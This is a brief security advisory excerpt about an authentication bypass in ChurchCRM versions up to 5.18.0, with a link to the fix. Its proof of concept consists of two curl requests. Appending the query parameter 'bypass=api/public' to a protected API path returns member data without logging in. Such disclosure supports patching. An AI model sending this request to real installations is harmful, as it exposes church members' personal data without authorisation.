Affected versions: ChurchCRM <= 5.18.0
Patched in: PR #7376 (merge commit 3a1cffd) — patch expected in 5.18.1+

Fix PR: https://github.com/ChurchCRM/CRM/pull/7376

Minimal PoC (demonstrates auth bypass):
### unauthenticated (expected HTTP/401)
curl -i 'https://<target>/api/persons/latest'

### bypass by adding query parameter (returns HTTP/200 and member data)
curl -i 'https://<target>/api/persons/latest?bypass=api/public'
